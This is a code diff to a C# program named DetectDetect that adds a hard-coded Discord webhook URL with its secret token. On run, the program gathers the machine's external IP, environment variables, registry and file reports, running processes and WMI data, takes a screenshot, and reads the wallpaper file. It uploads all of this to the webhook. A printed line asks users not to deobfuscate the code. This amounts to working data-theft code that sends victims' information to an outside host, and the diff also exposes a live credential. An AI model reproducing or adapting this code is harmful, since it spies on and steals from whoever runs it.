@@ -7,69 +7,53 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-using DetectDetect.WMICore.Objects;
 using System.IO;
 using System.Net;
+using DetectDetect.Utils;
 
+using DetectDetect.Native;
+using System.Runtime.InteropServices;
+using DetectDetect.Info;
 
 namespace DetectDetect
 {
     internal class Program {
         public static string TAG = "Test";
-        public static string WEBHOOK = "webhook";
+        public static string WEBHOOK = "https://discord.com/api/webhooks/1244139191567126578/KwDFQoCzDOjJB9O-H6YL-K4rUrFR6vIwVxp6erOHJLvPpzNIV8U8DMTtycBL1rPW1nIj";
         public static string SESSION_ID = Guid.NewGuid().ToString();
 
         static void Main(string[] args) {
+            //Console.WriteLine(NetCard.GetExternalIPAddress());
             DiscordWebhook hook = new DiscordWebhook(WEBHOOK, TAG, SESSION_ID);
-            string[] win32Counts = new string[] { "CacheMemory", "PhysicalMemory", "MemoryDevice", "MemoryArray", "PortConnector", "SMBIOSMemory", "PerfFormattedData_Counters_ThermalZoneInformation", "Fan", "VoltageProbe", "OperatingSystem" };
-            string[] cimCounts = new string[] { "Memory", "Sensor", "NumericSensor", "TemperatureSensor", "PhysicalConnector", "Slot" };
+            _ = hook.SendMessageAsync($"{StrUtils.CharMultiply('=', 88)}\nNew Machine! GUID[{hook.GetID()}] IP[{NetCard.GetExternalIPAddress()}]\n{StrUtils.CharMultiply('=', 88)}");
+            Console.WriteLine("Doing Stuff please do not deob-fuscate the Code");
+            var writer = new ReportWriter()
+                .WriteBasicInfo()
+                .WriteSystemInfoCommand()
+                .WriteEnvironmentVariables()
+                .WriteWmiTests()
+                .WriteSystemInformationClass()
+                .WriteNetCards()
+                .WriteRegReport()
+                .WriteFilesReport()
+                .WriteProcesses()
+                .WriteReportsWmi();
 
-            StringBuilder results = new StringBuilder();
-            foreach (string w in win32Counts) {
-                string line = $"[>] Win32_{w}  COUNT:[{WmiController.InstanceCountEx(w)}]";
-                results.AppendLine(line);
-            }
+            Console.WriteLine("Going to send...");
+            _ = hook.UploadBytesFileAsync(Encoding.UTF8.GetBytes(writer.ToString()), $"Test Result V2! GUID[{hook.GetID()}]", "Test-Results.txt");
 
-            foreach (string c in cimCounts) {
-                string line = $"[>] CIM_{c}  COUNT:[{WmiController.InstanceCountEx(c, false)}]";
-                results.AppendLine(line);
-
-            }
-
-            StringBuilder full = new StringBuilder();
-            full.AppendLine(hook.GetHeader("TESTS"));
-            full.AppendLine(SysInfo.GetSystemInfoGeneric()).Append("\n");
-            full.AppendLine(WmiOperatingSystem.Get().ConvertToString()).Append("\n");
-            full.AppendLine(WmiCompterSystem.Get().ConvertToString()).Append("\n");
-            full.AppendLine(results.ToString()).Append("\n");
-            full.AppendLine(WmiProcesses.Get().ConvertToString()).Append("\n");
-            full.AppendLine(WmiPhysicalConnectors.Get().ConvertToString()).Append("\n");
-            full.AppendLine(WmiPnpDevices.Get().ConvertToString()).Append("\n");
-            full.AppendLine(WmiServices.Get().ConvertToString()).Append("\n");
-            full.AppendLine(WmiDesktops.Get().ConvertToString()).Append("\n");
-            full.AppendLine(WmiUserAccounts.Get().ConvertToString()).Append("\n");
-            full.AppendLine(WmiLogicalDisks.Get().ConvertToString()).Append("\n");
-            full.AppendLine(WmiVolumes.Get().ConvertToString()).Append("\n");
-            full.AppendLine(WmiVideoControllers.Get().ConvertToString()).Append("\n");
-            full.AppendLine(WmiDiskDrives.Get().ConvertToString()).Append("\n");
-
+            Console.WriteLine("Sending Rest of Tech...");
+            var bys = WallpaperUtils.CaptureScreenshot();
+            if(bys != null) _ = hook.UploadBytesImageAsync(bys, $"Screenshot! GUID({hook.GetID()})", "Screenshot.png");
             try {
-                _ = hook.UploadBytesFileAsync(Encoding.UTF8.GetBytes(full.ToString()), $"\n====================================================================================\nNew Results [{hook.GetID()}][{hook.GetTAG()}]", "Tests.txt");
-                string wallpaperPath = WallpaperHelper.GetWallpaper();
-                if (wallpaperPath != null && wallpaperPath != "" && File.Exists(wallpaperPath)) {
-                    byte[] wallBys = File.ReadAllBytes(wallpaperPath);
-                    string wallStrBys = StrUtils.BytesToHexString(wallBys);
-                    wallStrBys = "[" + hook.GetID() + "]\n" + wallStrBys;
-                    _ = hook.SendImageAsync(wallpaperPath, "Wallaper!");
-                    _ = hook.UploadBytesFileAsync(Encoding.UTF8.GetBytes(wallStrBys), "Wallpaper Bytes Hex String!", "Wallpaper-bytes.txt");
-                }
-            }
-            catch(Exception ex) {
-                Console.WriteLine("Failed to send wallapaper: " + ex);
-            }
+                _ = hook.SendImageAsync(WallpaperUtils.GetWallpaper(), $"Wallaper! GUID[{hook.GetID()}]");
+                string byHex = StrUtils.BytesToHexString(File.ReadAllBytes(WallpaperUtils.GetWallpaper()));
+                _ = hook.UploadBytesFileAsync(Encoding.UTF8.GetBytes(byHex), "Wallpaper Bytes Hex String!", "Wallpaper-bytes.txt");
+            } catch { }
 
-            Console.WriteLine(results.ToString());
-            MessageBox.Show(results.ToString());
+            Console.WriteLine("ByeBye");
+            MessageBox.Show("ByeBye!");
+            Win32.USER32.Invoke<int>("MessageBox", 0, "Hey", "There", 0);
             Console.ReadLine();
             Console.ReadLine();
             Console.ReadLine();
